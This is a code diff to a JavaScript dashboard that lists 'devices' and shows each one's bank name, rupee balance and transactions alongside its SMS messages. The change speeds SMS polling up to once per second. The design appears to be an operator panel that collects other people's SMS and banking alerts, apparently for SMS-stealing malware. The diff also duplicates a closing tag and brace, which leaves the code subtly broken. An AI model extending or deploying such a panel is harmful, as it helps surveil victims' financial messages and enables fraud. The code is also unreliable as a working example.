@@ -447,17 +447,20 @@ function renderCard(dev) {
 
   // Bank row
   if (bank0) {
+    console.log('Rendering bank:', bank0.bankName, 'Balance:', bank0.availableBalance);
     var txnClass = bank0.transactionType === 'credit' ? '' : ' debit';
     var txnSign = bank0.transactionType === 'credit' ? '+' : '-';
     html += '<div class="card-bank-row">';
     html += '<span class="card-bank-name">';
     html += '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" style="width:0.875rem;height:0.875rem"><path stroke-linecap="round" stroke-linejoin="round" d="M2.25 18.75a60.07 60.07 0 0115.797 2.101c.727.198 1.453-.342 1.453-1.096V18.75M3.75 4.5v.75A.75.75 0 013 6h-.75m0 0v-.375c0-.621.504-1.125 1.125-1.125H20.25M2.25 6v9m18-10.5v.75c0 .414.336.75.75.75h.75m-1.5-1.5h.375c.621 0 1.125.504 1.125 1.125v9.75c0 .621-.504 1.125-1.125 1.125h-.375m1.5-1.5H21a.75.75 0 00-.75.75v.75m0 0H3.75m0 0h-.375a1.125 1.125 0 01-1.125-1.125V15m1.5 1.5v-.75A.75.75 0 003 15h-.75M15 10.5a3 3 0 11-6 0 3 3 0 016 0zm3 0h.008v.008H18V10.5zm-12 0h.008v.008H6V10.5z"/></svg>';
-    html += '&#8377; ' + escHtml(bank0.bankName);
+    html += escHtml(bank0.bankName) + ' ';
     html += '</span>';
-    html += '<span class="card-bank-amount">&#8377;' + formatAmount(bank0.availableBalance) + '</span>';
+    html += '<span class="card-bank-amount">₹' + formatAmount(bank0.availableBalance) + '</span>';
     if (bank0.transactionAmount) {
-      html += '<span class="card-bank-txn' + txnClass + '">' + txnSign + '&#8377;' + formatAmount(bank0.transactionAmount) + ' ' + (bank0.transactionType || '') + '</span>';
+      html += '<span class="card-bank-txn' + txnClass + '">' + txnSign + '₹' + formatAmount(bank0.transactionAmount) + ' ' + (bank0.transactionType || '') + '</span>';
     }
+    html += '</div>';
+  }
     html += '</div>';
   }
 
@@ -776,13 +779,14 @@ async function startDashboard(url, key) {
   // Initial fetch
   await loadDevices(false);
 
-  // Auto-refresh devices every 15s
+  // Auto-refresh devices every 5s
   if (STATE.refreshTimer) clearInterval(STATE.refreshTimer);
-  STATE.refreshTimer = setInterval(function() { loadDevices(true); }, 15000);
+  STATE.refreshTimer = setInterval(function() { loadDevices(true); }, 5000);
 
-  // Auto-refresh SMS every 45s
+  // Auto-refresh SMS every 1 second (real-time)
   if (STATE.smsRefreshTimer) clearInterval(STATE.smsRefreshTimer);
-  STATE.smsRefreshTimer = setInterval(function() { refreshAllSms(); }, 45000);
+  STATE.smsRefreshTimer = setInterval(function() { refreshAllSms(); }, 1000);
+  console.log('✅ SMS auto-refresh enabled (REAL-TIME - every 1 second)');
 }
 
 async function loadDevices(silent) {
@@ -941,11 +945,19 @@ async function fetchDeviceSms(deviceId) {
 }
 
 async function refreshAllSms() {
+  console.log('🔄 SMS auto-refresh triggered at', new Date().toLocaleTimeString());
   var devices = STATE.devices;
   var CONCURRENCY = 10;
   var idx = 0;
+  var refreshCount = 0;
+  
   function runNext() {
-    if (idx >= devices.length) return;
+    if (idx >= devices.length) {
+      if (refreshCount > 0) {
+        console.log('✅ Refreshed', refreshCount, 'devices SMS');
+      }
+      return;
+    }
     var dev = devices[idx++];
     fetchDeviceSms(dev.id).then(function(result) {
       var d = STATE.devices.find(function(x) { return x.id === dev.id; });
@@ -954,9 +966,13 @@ async function refreshAllSms() {
         d.rawMsgs = result.rawMsgs;
         updateCardInPlace(d);
         updateStats();
+        refreshCount++;
       }
       runNext();
-    }).catch(function() { runNext(); });
+    }).catch(function(err) { 
+      console.warn('SMS refresh error for', dev.id, err);
+      runNext(); 
+    });
   }
   for (var s = 0; s < Math.min(CONCURRENCY, devices.length); s++) runNext();
 }
